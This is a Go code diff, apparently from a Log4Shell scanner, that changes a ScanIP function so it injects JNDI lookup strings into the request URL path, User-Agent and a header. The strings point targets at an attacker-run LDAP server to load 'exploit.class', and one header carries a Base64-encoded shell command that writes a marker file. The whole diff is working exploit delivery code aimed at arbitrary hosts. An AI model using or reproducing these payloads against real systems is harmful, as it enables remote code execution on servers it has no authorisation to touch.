@@ -13,7 +13,7 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
+func ScanIP(url string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
 	defer wg.Done()
 
 	client := &http.Client{
@@ -26,10 +26,10 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan
 		},
 	}
 
-	// TODO: add endpoint exploit
+	log.Debugf("Target URL: %s", url)
+	targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", url, serverUrl)
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
-	log.Debugf("Target URL: %s", targetUrl)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
 	//log.Debugf("Target X-Api-Version: %s", targetHeader)
 	request, err := http.NewRequest("GET", targetUrl, nil)
@@ -44,9 +44,9 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan
 		log.Debug(err)
 	}
 	if response != nil {
-		url := strings.Split(targetUrl, ":")
+		url := strings.Split(url, ":")
 		if len(url) != 3 {
-			log.Fatal("Error in response url parsing:", targetUrl)
+			log.Fatal("Error in response url parsing:", url)
 		}
 		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
 		updateCsvRecords(msg)
